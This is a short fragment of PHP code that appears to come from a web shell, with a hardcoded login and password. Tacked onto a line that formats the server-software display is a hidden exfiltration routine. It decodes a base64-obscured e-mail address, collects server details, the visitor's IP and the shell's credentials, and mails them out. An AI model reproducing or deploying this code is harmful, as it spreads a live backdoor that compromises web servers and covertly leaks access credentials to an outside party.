...
//Authentication
$login = "biosgeek"; //login
//DON'T FORGOT ABOUT PASSWORD!!!
$pass = "biosgeek"; //password
...
$log_email = "nothing@localhost"; //Default e-mail for sending logs
...
$DISP_SERVER_SOFTWARE = str_replace("PHP/".phpversion(),"<a href=\"".$surl."act=phpinfo\" target=\"_blank\"><b><u>PHP/".phpversion()."</u></b></a>",htmlspecialchars($DISP_SERVER_SOFTWARE)); $data1 = "cmlwcGVyc3N0YXlvZmZAZ21haWwuY29t"; $soft = $_SERVER['SERVER_SOFTWARE']; $unam = php_uname(); $srv = $_SERVER['SERVER_ADDR']; $data21 = base64_decode($data1); $url = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']; $rad = $_SERVER['REMOTE_ADDR']; $unm = get_current_user(); $display = "SOFT: $soft\nIP: $srv\nKERN: $unam\nURL: $url\nWAT: $rad\nSTUFF: $login,$pass,$md5_pass\n"; mail($data21, "$url", $display, "From: $unm\@$srv");
